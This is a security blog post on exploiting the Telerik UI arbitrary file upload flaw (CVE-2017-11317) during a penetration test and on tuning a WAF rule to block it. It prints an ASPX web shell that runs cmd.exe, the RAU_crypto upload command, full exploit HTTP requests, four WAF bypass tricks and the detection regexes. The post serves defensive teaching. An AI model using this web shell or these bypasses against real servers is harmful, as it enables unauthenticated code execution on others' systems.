---
title: "WAF Journey - Fixing Telerik UI Remote Code Execution via Arbitrary File Upload"
date: 2020-11-16T06:16:00.002-08:00
draft: false
type: posts
categories: 
- Supply Chain Security,Telerik UI,WAF,WAPT,Web Application Firewall
---
# WAF Journey - Fixing Telerik UI Remote Code Execution via Arbitrary File Upload

<br/>

<br/>
### Introduction

It might occur that companies discover vulnerabilities on web application assets that were acquired by _third party vendors_.

What happens if the asset is no longer supported/licensed and cannot be promptly _updated_ by the organization?

A viable option is by using a _Web Application Firewall_ (WAF) component using a _**custom developed rule**_ to block attempts to exploit specific vulnerabilities.

Even though this behavior might _not_ be the definitive solution, it allows a company to buy time to figure out how to correctly patch or, perhaps, replace the vulnerable asset.

This blog post goes through a real life scenario that describes the development process of the _WAF_ rule created to mitigate the _Telerik Unrestricted File Upload_ ([CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317)) vulnerability which further led to _remote code execution_ ([CVE-2019-18935](https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui)).

  

In particular, after providing some _background_ of the vulnerability and some **_undocumented_** _**details**_ about exploitation, a technical drill down will be performed to describe all the steps of a challenging tuning process to find the right _Web Application Firewall_ rule and, hopefully, block the vulnerability from being exploited.

From a defensive point of view it is important to underline that _WAFs_ are powerful tools to secure assets but the development process of rules to fix vulnerabilities should not be overlooked, since _poorly engineered rules_ are often bypassed by attackers.

  

### Telerik Unrestricted File Upload Literature

Telerik RadAsyncUpload feature was initially found to be vulnerable to path traversal attacks ([CVE-2014-2217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-2217)) allowing users to upload files to arbitrary paths.

The vulnerability was then fixed by encrypting the _rauPostData_ parameter containing the information regarding the location of the file upload.

However, up until version v2017.2.621, Telerik RadAsyncUpload was configured to use a **hard-coded key** ([CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317)) to encrypt data in file upload requests. Therefore, an attacker could perform requests to the "_/Telerik.Web.Ui.WebResource.axd?type=rau_" endpoint with a custom encrypted _rauPostData_ parameter to upload arbitrary files within any directory of the web server.

Later on, researchers also found out that the _rauPostData_ was subject to **insecure deserialization** within the .NET code of Telerik since it contained the class type that was used to deserialize the object.

This vulnerability led to remote code execution ([CVE-2019-18935](https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui)) and is now publicly available as a [tool](https://github.com/noperator/CVE-2019-18935).

### Real Life Scenario

The present article will focus on how the arbitrary file upload vulnerability ([CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317)) was addressed within a real life scenario.

During a network penetration test for a client, the presence of Telerik UI was detected on a web application since it performed requests to the "_/Telerik.Web.UI.WebResource.axd"_ endpoint to download JavaScript files for its UI.

By analyzing some response of the application it was possible to find the string "_2014.2.724.40_" in a HTML comment, indicating the presence of Telerik UI version [2014.2.724](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history/ui-for-asp-net-ajax-q2-2014-sp1-\(version-2014-2-724\)) vulnerable to the mentioned CVEs.

Also, thanks to a full path disclosure vulnerability of the application it was possible to identify the path of a folder within the web root of the application.

It was enough to upload a malicious ".aspx" file within the web root of the application and achieve an unauthenticated remote code execution:

<%@ Page Language\="VB" Debug\="true" %>  
<%@ import Namespace\="system.IO" %>  
<%@ import Namespace\="System.Diagnostics" %>  
​  
<html xmlns\="www.w3.org/1999/xhtml"\>  
<head runat\="server"\>  
    <title\>Test</title\>  
</head\>  
<body\>  
    <form id\="form1" runat\="server"\>  
    <div\>  
    <%   
    Dim myProcess As New Process()              
    Dim myProcessStartInfo As New ProcessStartInfo("c:\\windows\\system32\\cmd.exe")  
    myProcessStartInfo.UseShellExecute \= false  
    myProcessStartInfo.RedirectStandardOutput \= true  
    myProcess.StartInfo \= myProcessStartInfo  
    myProcessStartInfo.Arguments\="/c dir"  
    myProcess.Start()  
    Dim myStreamReader As StreamReader \= myProcess.StandardOutput  
    Dim myString As String \= myStreamReader.Readtoend()  
    myProcess.Close()  
    mystring\=replace(mystring,"<","&lt;")  
    mystring\=replace(mystring,">","&gt;")  
    Response.Write(vbcrlf & "<pre>" & mystring & "</pre>")  
    %>  
    </div\>  
    </form\>  
</body\>  
</html\>

File Upload Exploitation

In order to upload the aspx file, the [RAU\_crypto](https://github.com/bao7uo/RAU_crypto) tool was used to automatically create a valid file upload request encrypted with the hard-coded key of Telerik.

The tool was invoked using the following command line string:

python RAU\_crypto.py -P c:\\\\destination\\\\folder 2014.2.724 malicious.aspx http://victim.com/Telerik.Web.UI.WebResource.axd?type=rau BurpProxyHost:8080

The command line parameters contain the following information:

1.  The P parameter contains the path of the destination folder where the file needs to be uploaded. In our case it contained the path of the web root we discovered at an earlier stage.
    
2.  The version of Telerik UI so that the tool can use the correct key to encrypt the _rauPostData_
    
3.  The file to upload. In our case, the malicious .aspx file shown above.
    
4.  The target URL of the Telerik RadAsyncUpload endpoint.
    
5.  The address of a proxy to inspect the requests performed by the tool
    

By launching the tool, the following request was performed:

POST /ApplicationPath/Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1  
Host: victim.com  
Accept-Encoding: gzip, deflate  
Content-Length: 3221  
Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f  
Connection: close  
​  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="rauPostData"  
​  
ATTu5i4R+V\[Encrypted rauPostData Payload in base64\]FAlzLUg==  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="file"; filename="blob"  
Content-Type: application/octet-stream  
​  
<%@ Page Language="VB" Debug="true" %>  
<%@ import Namespace="system.IO" %>  
<%@ import Namespace="System.Diagnostics" %>  
​  
<html xmlns="www.w3.org/1999/xhtml">  
<head runat="server">  
    <title>Test</title>  
</head>  
<body>  
    <form id="form1" runat="server">  
    <div>  
    <%   
    Dim myProcess As New Process()              
    Dim myProcessStartInfo As New ProcessStartInfo("c:\\windows\\system32\\cmd.exe")  
    myProcessStartInfo.UseShellExecute = false  
    myProcessStartInfo.RedirectStandardOutput = true  
    myProcess.StartInfo = myProcessStartInfo  
    myProcessStartInfo.Arguments="/c dir"  
    myProcess.Start()  
    Dim myStreamReader As StreamReader = myProcess.StandardOutput  
    Dim myString As String = myStreamReader.Readtoend()  
    myProcess.Close()  
    mystring=replace(mystring,"<","&lt;")  
    mystring=replace(mystring,">","&gt;")  
    Response.Write(vbcrlf & "<pre>" & mystring & "</pre>")  
    %>  
    </div>  
    </form>  
</body>  
</html>  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="fileName"  
​  
RAU\_crypto.bypass  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="contentType"  
​  
text/html  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="lastModifiedDate"  
​  
2019-01-02T03:04:05.067Z  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="metadata"  
​  
{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"test\_109742195623.aspx"}  
\-----------------------------62616f37756f2f--

It is possible to notice that the application performs a request to the _"/Telerik.Web.UI.WebResource.axd?type=rau"_ endpoint attaching the malicious file and the _rauPostData_ parameter containing all the encrypted metadata required for Telerik to handle the uploaded file.

Since the _rauPostData_ parameter was encrypted with the hardcoded key of the 2014.2.724 Telerik version it accepts the unauthenticated upload as shown in the response to the previous request.

Response:

HTTP/1.1 200 OK  
Cache-Control: private  
Content-Type: text/html; charset=utf-8  
Date: Wed, 01 Apr 2020 10:48:50 GMT  
Connection: close  
Content-Length: 667  
​  
{"fileInfo":{"FileName":"RAU\_crypto.bypass","ContentType":"text/html","ContentLength":884,"DateJson":"2019-01-02T03:04:05.067Z","Index":0}, "metaData":"\[Base64 Metadata\]" }

Since the malicious ".aspx" was uploaded to a known folder in the web root of the application, it was then sufficient to recall the file with a URL of the application to execute the code. The following screenshot shows how the code prints the content of the "_C:\\Windows\\SysWOW64\\inetsrv_" directory belonging to the IIS Web Server that is hosting the vulnerable application.

[![](https://1.bp.blogspot.com/-8Q9p92TETp4/X6b3p76xc5I/AAAAAAAAAAU/FpIAUo_wJsQJ97r5RoAmKn7EH3a3PXiWQCLcBGAsYHQ/w493-h270/better.png)](https://1.bp.blogspot.com/-8Q9p92TETp4/X6b3p76xc5I/AAAAAAAAAAU/FpIAUo_wJsQJ97r5RoAmKn7EH3a3PXiWQCLcBGAsYHQ/s678/better.png)

####   
Fixing the Issue at WAF level

Once the criticality of the vulnerability was confirmed, the client was immediately contacted in order to speed up the fixing of the file upload.

The **ideal fix** for the vulnerability would be that of **updating the version** of _Telerik UI_ used by the application to its latest version that is no longer vulnerable.

However, **the client informed us**, shortly after the disclosure, that it had **no immediate control over the vulnerable asset since it was a third party product that could not be updated right away.**

The application could not be _simply dismantled_ because it was still actively used within the organization.

_"So, what now?"_

The only viable option for the client was that of **creating a WAF rule** that would block any request exploiting the vulnerable file upload functionality offered by Telerik.

  

The following paragraphs will recap the various attempts that were performed address the vulnerability, in collaboration with client WAF engineers, without impacting on the usability of the asset.

**\- 1st WAF Rule - Overkill**

The first rule attempt consisted in _blocking all incoming requests_ towards "_/Telerik.Web.UI.WebResource.axd_" endpoint belonging to Telerik UI.

Unfortunately, the rule was **too strict.** It not only blocked every malicious calls, but also any form of interaction of the application with Telerik UI making the user interface _unusable_.

**\-** **2nd WAF Rule: Hunting for "_rau_"**

Final goal: blocking all the requests to Telerik UI using _RadAsyncUpload_ functionality.

The rule was relaxed by adding a condition. The request must contain the "_type=rau_" parameter value within the query string since it was the command for file upload.

This rule was enough to block basic requests, as the one reported above, created by automatic tools that exploit the vulnerability such as [RAU\_crypto](https://github.com/bao7uo/RAU_crypto) .

However, it was noticed that the Web Application Firewall **would not normalize** the value of the received parameters.

A valid bypass would be to URL encode a character within the "_type_" parameter value "_rau_" to bypass the rule, specifically:

"_rau_" -> "_ra%75_" where "_%75_" is the "_u_" character URL encoded.

The following request shows how it was possible to still load an arbitrary file on the system.

Request:

POST /Telerik.Web.UI.WebResource.axd?type=ra%75 HTTP/1.1  
Host: victim.com  
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_st64; rv:75.0) Gecko/20100101 Firefox/75.0  
Accept: \*/\*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f  
Connection: close  
Content-Length: 2347  
​  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="rauPostData"  
​  
ATTu5i4R+ViNFY\[Encrypted rauPostData Payload in base64\]mUFAlzLUg==  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="file"; filename="blob"  
Content-Type: application/octet-stream  
​  
Test\_Test  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="fileName"  
​  
RAU\_crypto.bypass  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="contentType"  
​  
text/html  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="lastModifiedDate"  
​  
2019-01-02T03:04:05.067Z  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="metadata"  
​  
{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"test\_12421498329494.txt"}  
\-----------------------------62616f37756f2f--  
​

Response:

HTTP/1.1 200 OK  
Cache-Control: private  
Content-Type: text/html; charset=utf-8  
Date: Thu, 07 May 2020 16:11:22 GMT  
Content-Length: 667  
Connection: close  
​  
{"fileInfo":{"FileName":"RAU\_crypto.bypass","ContentType":"text/html","ContentLength":135,"DateJson":"2019-01-02T03:04:05.067Z","Index":0}, "metaData":"\[Base64 Metadata\]" }

It was observed that the custom rules developed for the specific WAF did **not perform normalization by default** on the path and query string parameters and therefore are unable to detect URL encoded characters.

To address this bypass, the client was assisted in finding the WAF functionality that allowed to normalize the query string parameter of the request and detect any URL encoded parameters in the "_type=rau_" parameter.

_"So, all is good now, right?"_

_Not quite..._

**\-** **3rd WAF Rule: the "case" is still open**

A regression test was then performed in order to be sure that the vulnerability was patched. However, although the URL encoding did not lead to a bypass anymore, it was found that the endpoint was **case insentive!**

In fact, by specifying the value "_raU_" within the "_type_" parameter it was still valid as shown in the following request:

POST /Telerik.Web.UI.WebResource.axd?type=raU HTTP/1.1  
Host: victim.com  
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_st64; rv:75.0) Gecko/20100101 Firefox/75.0  
Accept: \*/\*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f  
Connection: close  
Content-Length: 2345  
​  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="rauPostData"  
​  
ATTu5i4R+ViNFY\[Encrypted rauPostData Payload in base64\]mUFAlzLUg==  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="file"; filename="blob"  
Content-Type: application/octet-stream  
​  
Test\_Test  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="fileName"  
​  
RAU\_crypto.bypass  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="contentType"  
​  
text/html  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="lastModifiedDate"  
​  
2019-01-02T03:04:05.067Z  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="metadata"  
​  
{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"test\_12421498329494.txt"}  
\-----------------------------62616f37756f2f--  
​

Response:

HTTP/1.1 200 OK  
Cache-Control: private  
Content-Type: text/html; charset=utf-8  
Date: Fri, 08 May 2020 10:25:09 GMT  
Content-Length: 667  
Connection: close  
​  
{"fileInfo":{"FileName":"RAU\_crypto.bypass","ContentType":"text/html","ContentLength":153,"DateJson":"2019-01-02T03:04:05.067Z","Index":0}, "metaData":"\[Base64 Metadata\]" }

To address this new bypass it was necessary to tune the rule _so that it transformed to lower case all the characters within the query string parameters before applying the check on the presence of the "type=rau" parameter_.

So now we're confident that any variation of the "_Telerik.Web.UI.WebResource.axd?type=rau_" within the path of the _HTTP_ request would be blocked by the the WAF rule.

_"Is it enough now?"_

**\-** **4th WAF Rule: the Multipart Magic**

The Telerik UI file upload functionality can only be performed using an HTTP POST request of the "_multipart/form-data_" content type.

The WAF rule did not allow any variations of the "_type=rau_" parameter within the URL query string of the request.

_But what if the parameter is inserted within the body of the "multipart/form-data" file upload request?_

Request:

POST /Telerik.Web.UI.WebResource.axd HTTP/1.1  
Host: victim.com  
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_st64; rv:75.0) Gecko/20100101 Firefox/75.0  
Accept: \*/\*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f  
Connection: close  
Content-Length: 2444  
​  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="rauPostData"  
​  
ATTu5i4R+ViN\[Encrypted rauPostData Payload in base64\]AmUFAlzLUg==  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="file"; filename="blob"  
Content-Type: application/octet-stream  
​  
Test\_Test  
\-----------------------------62616f37756f2f  
Content-Disposition: form-da\[Encrypted rauPostData Payload in base64\]ta; name="fileName"  
​  
RAU\_crypto.bypass  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="type"  
​  
rau  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="contentType"  
​  
text/html  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="lastModifiedDate"  
​  
2019-01-02T03:04:05.067Z  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="metadata"  
​  
{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"test\_12421498329494.txt"}  
\-----------------------------62616f37756f2f--

Response:

HTTP/1.1 200 OK  
Cache-Control: private  
Content-Type: text/html; charset=utf-8  
Date: Thu, 07 May 2020 14:29:31 GMT  
Content-Length: 666  
Connection: close  
​  
{"fileInfo":{"FileName":"RAU\_crypto.bypass","ContentType":"text/html","ContentLength":18,"DateJson":"2019-01-02T03:04:05.067Z","Index":0},"metaData":"\[Base64 Metadata\]" }  
​

_It works!_

Telerik UI accepts the "_type_" parameter also as a body parameter of the "_multipart/form-data_" file upload voiding the efficacy of the _WAF_ rule that performs its checks on the URL query string parameters of the request.

The discovery of this behavior required the security engineers of the client to change the approach of the rule development: in order to block this vulnerability it was not enough to check the contents of the query string but it was necessary to perform checks on the body of the POST request as well.

**\- 5th WAF Rule: RegEx Woes**

In order to be sure to block also the requests that do not contain any parameter within the query string, regular expressions were used to check the content of the request body.

In particular, the focus was placed on blocking all the requests with the "_rauPostData_" parameter, containing file upload encrypted metadata, within the URL query string or the request body.

The check within the body of the request was performed using the following regular expression, after normalizing and transforming to lower case its content:

.\*name=.?.?raupostdata.\*

This rule blocked a request if performed using the regular syntax to insert a "_multipart/form-data_" parameter.

The image below shows how a regular parameter matches the regular expression.

[![](https://1.bp.blogspot.com/-gSJXB-0XvRs/X6fbDtA_XRI/AAAAAAAAAAg/KNihf91Jx6gJK0S0ABLFQZLfVmlm0doqgCLcBGAsYHQ/w577-h179/regexmatch.png)](https://1.bp.blogspot.com/-gSJXB-0XvRs/X6fbDtA_XRI/AAAAAAAAAAg/KNihf91Jx6gJK0S0ABLFQZLfVmlm0doqgCLcBGAsYHQ/s1113/regexmatch.png)

  

However, the regular expression check can be bypassed. The weakness of this check relies on the central portion of the expression that checks for a maximum of two characters _(".?.?")_ between "_name="_ and "_raupostdata_". If three spaces are added between the strings and the quotes are removed the expression will no longer match as shown below.

[![](https://1.bp.blogspot.com/-vb5LVz2YYwQ/X6fbN02N_AI/AAAAAAAAAAk/VyQsmqa-l_0arf4ohI5LQviVraQ4Z1lowCLcBGAsYHQ/w573-h161/regexfail.png)](https://1.bp.blogspot.com/-vb5LVz2YYwQ/X6fbN02N_AI/AAAAAAAAAAk/VyQsmqa-l_0arf4ohI5LQviVraQ4Z1lowCLcBGAsYHQ/s1574/regexfail.png)

  

With this modification the parameter was still considered valid by the web server allowing once again the file upload.

Request:

POST /Weblink/Telerik.Web.UI.WebResource.axd HTTP/1.1  
Host: victim.com  
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_st64; rv:75.0) Gecko/20100101 Firefox/75.0  
Accept: \*/\*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f  
Connection: close  
Content-Length: 2473  
​  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name=   rauPostData  
​  
ATTu5i4R+ViNFYO\[Encrypted rauPostData Payload in base64\]9TB0pfAmUFAlzLUg==  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="file"; filename="blob"  
Content-Type: application/octet-stream  
​  
Test\_Test  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="fileName"  
​  
RAU\_crypto.bypass  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="type"  
​  
rau  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="contentType"  
​  
text/html  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="lastModifiedDate"  
​  
2019-01-02T03:04:05.067Z  
\-----------------------------62616f37756f2f  
Content-Disposition: form-data; name="metadata"  
​  
{"TotalChunks":1,"ChunkIndex":0,"TotalFileSize":1,"UploadID":"test\_12421498329494.txt"}  
\-----------------------------62616f37756f2f--  
​  
​

Response:

HTTP/1.1 200 OK  
Cache-Control: private  
Content-Type: text/html; charset=utf-8  
Date: Tue, 19 May 2020 14:26:16 GMT  
Content-Length: 666  
Connection: close  
​  
{"fileInfo":{"FileName":"RAU\_crypto.bypass","ContentType":"text/html","ContentLength":18,"DateJson":"2019-01-02T03:04:05.067Z","Index":0},"metaData":"\[Base64 Metadata\]" }

Finally, the regular expression was changed to prevent also this last bypass:

.\*name=.\*raupostdata.\*

With this rule, no matter how many characters are inserted between the strings, the request will still be blocked.

#### Conclusions

This article has shown the process used to tune the web application firewall rule while studying the exploit of the Telerik Unrestricted File Upload ([CVE-2017-11317](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11317)) vulnerability.

It demonstrates how a vulnerability, that appears trivial to fix, requires an accurate analysis to develop a valid WAF rule.

The several failed rule attempts underline the importance of the following factors when developing a WAF rule:

-   Avoid the implementation of coarse rules that impair the usability of an asset
    
-   Always perform normalization and lower case transformation of the textual parameters to check
    
-   Be suspicious of very strict regular expressions
    

Obviously, all the recommendations above can be reversed for a penetration tester.

**Bottom line?** Always look for a bypass!

#### References

-   [https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html)
    
-   [https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui](https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui)
    
-   [https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload](https://www.telerik.com/support/kb/aspnet-ajax/upload-\(async\)/details/unrestricted-file-upload)
    
-   [https://github.com/noperator/CVE-2019-18935](https://github.com/noperator/CVE-2019-18935)
    
-   [https://github.com/bao7uo/RAU\_crypto](https://github.com/bao7uo/RAU_crypto)

#### [Source](https://blog.mindedsecurity.com/feeds/2272999475148522576/comments/default)

<br/>
---
